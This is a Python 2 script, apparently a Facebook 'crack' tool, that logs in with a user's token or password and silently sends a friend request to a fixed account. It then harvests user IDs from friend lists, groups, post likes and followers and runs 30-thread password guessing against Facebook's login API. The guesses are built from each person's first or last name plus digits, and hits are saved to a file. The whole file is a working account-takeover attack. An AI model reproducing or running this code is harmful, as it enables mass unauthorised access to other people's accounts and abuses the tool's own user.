#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize, bs4, subprocess
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def azim():
	os.system('echo -e "\n=============================================\n" | lolcat ')
def banner():
	os.system('echo -e "\n\n    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ \n    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   \n         ░  ░  ░ ░     ░         ░   \n             ░                       \n\n╔═══════════════════════════════════════════╗\n║  Author   : Mahmud Azim                   ║\n║  Github   : https://github.com/Azim-Vau   ║           \n║  Fb       : https://me.fb/AzimVau69       ║           \n╚═══════════════════════════════════════════╝" | lolcat ')

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mSedang Login \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

os.system('pip install lolcat')

def masuk():
    os.system('clear')
    banner()
    azim()
    os.system('echo -e "[01] Login Using Token Facebook\n[02] Login Using Email Facebook\n[03] Update Tools\n[00] Exit" | lolcat')
    azim()
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;92mAzim/\x1b[91m>\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        login()
    elif msuk == '3' or msuk == '03':
        os.system('python2 crack.py')
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Fill Correctly !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    banner()
    azim()
    toket = raw_input('\x1b[1;97m[\x1b[1;91m?\x1b[1;97m] Token \x1b[1;91m:\x1b[1;92m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m{\x1b[1;92m\xe2\x9c\x93\x1b[1;97m}\x1b[1;92m Login Berhasil'
        menu()
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;91mToken salah !'
        time.sleep(1.7)
        masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        banner()
        azim() 
        print '\x1b[1;97mPlease Use Facebook New No Facebook Old '
        id = raw_input('\x1b[1;92m+ \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;92m+ \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mNo connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Succes'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mNo connection'
                keluar()

        if 'CPpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya Akun Anda Checkpoint'
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '{!} No connection'
        keluar()

    os.system('clear')
    banner()
    azim() 
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;97m                  '
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ID   \x1b[1;91m: \x1b[1;92m' + id + '\x1b[1;97m              '
    azim() 
    os.system('echo -e "[01] Crack From FriendList\n[02] Crack From Public ID\n[03] Crack From Group\n[04] Crack From Like Posts Friend / Group\n[05] Crack From Followers Facebook" | lolcat')
    azim() 
    pilih_menu()


def pilih_menu():
    global cekpoint
    global oks
    peak = raw_input('\x1b[1;97mAzim/\x1b[1;91m> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mFill Correctly'
        pilih_menu()
    elif peak == '1' or peak == '01':
        os.system('clear')
        banner()
        azim() 
        jalan('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Mengambil ID \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2' or peak == '02':
        os.system('clear')
        banner()
        azim() 
        idt = raw_input('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mID Public \x1b[1;91m:\x1b[1;92m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name \x1b[1;91m:\x1b[1;92m ' + sp['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Public/Teman There Is No !'
            raw_input('\n\x1b[1;93m[\x1b[1;97mBack Menu\x1b[1;93m]')
            crack_indo()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} No connection !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3' or peak == '03':
        os.system('clear')
        banner()
        azim() 
        idg = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Enter ID Group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Name Group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mGroup Tidak Ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

        jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Gettings ID \x1b[1;97m...')
        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])

    elif peak == '4' or peak == '04':
        crack_likes()
    elif peak == '5' or peak == '05':
        crack_follow()
    elif peak == '0' or peak == '00':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mFill Correctly'
        pilih_menu()
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    azim() 

    def main(arg):
        user = arg
        try:
            os.mkdir('avsid')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1
                cek = open('avsid/cfbid.txt', 'a')
                cek.write('ID :' + user + ' Password :' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2
                    cek = open('avsid/cfbid.txt', 'a')
                    cek.write('ID :' + user + ' Password :' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3
                        cek = open('avsid/cfbid.txt', 'a')
                        cek.write('ID :' + user + ' Password :' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4
                            cek = open('avsid/cfbid.txt', 'a')
                            cek.write('ID :' + user + ' Password :' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5
                                cek = open('avsid/cfbid.txt', 'a')
                                cek.write('ID :' + user + ' Password :' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '102030'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6
                                    cek = open('avsid/cfbid.txt', 'a')
                                    cek.write('ID :' + user + ' Password :' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avsid/cfbid.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        os.system('clear')
        banner()
        azim() 
        tez = raw_input('\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ID Post Group/Friends\x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m[\x1b[1;96m\xe2\x80\xa2\x1b[1;97m] \x1b[1;96mMengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Postingan Salah !'
        raw_input('\n\x1b[1;96mEnter Go Back')
        menu()

    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    azim() 

    def main(arg):
        user = arg
        try:
            os.mkdir('avsid')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1
                cek = open('avsid/cfbid.txt', 'a')
                cek.write('ID :' + user + ' Password :' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2
                    cek = open('avsid/cfbid.txt', 'a')
                    cek.write('ID :' + user + ' Password :' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3
                        cek = open('avsid/cfbid.txt', 'a')
                        cek.write('ID :' + user + ' Password :' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4
                            cek = open('avsid/cfbid.txt', 'a')
                            cek.write('ID :' + user + ' Password :' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5
                                cek = open('avsid/cfbid.txt', 'a')
                                cek.write('ID :' + user + ' Password :' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '102030'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6
                                    cek = open('avsid/cfbid.txt', 'a')
                                    cek.write('ID :' + user + ' Password :' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avsid/cfbid.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    banner()
    azim() 
    idt = raw_input('\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mID Public/Friends \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mName \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Public/teman tidak ada !'
        raw_input('\n\x1b[1;97mBack To Menu')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No connection !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total Followers \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Process Has Been Started ...'
    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Use 5 Second Airplane Mode'
    azim() 

    def main(arg):
        user = arg
        try:
            os.mkdir('avsid')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass1
                cek = open('avsid/cfbid.txt', 'a')
                cek.write('ID :' + user + ' Password :' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass2
                    cek = open('avsid/cfbid.txt', 'a')
                    cek.write('ID :' + user + ' Password :' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass3
                        cek = open('avsid/cfbid.txt', 'a')
                        cek.write('ID :' + user + ' Password :' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['last_name'] + '12345'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass4
                            cek = open('avsid/cfbid.txt', 'a')
                            cek.write('ID :' + user + ' Password :' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass5
                                cek = open('avsid/cfbid.txt', 'a')
                                cek.write('ID :' + user + ' Password :' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '102030'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass6
                                    cek = open('avsid/cfbid.txt', 'a')
                                    cek.write('ID :' + user + ' Password :' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
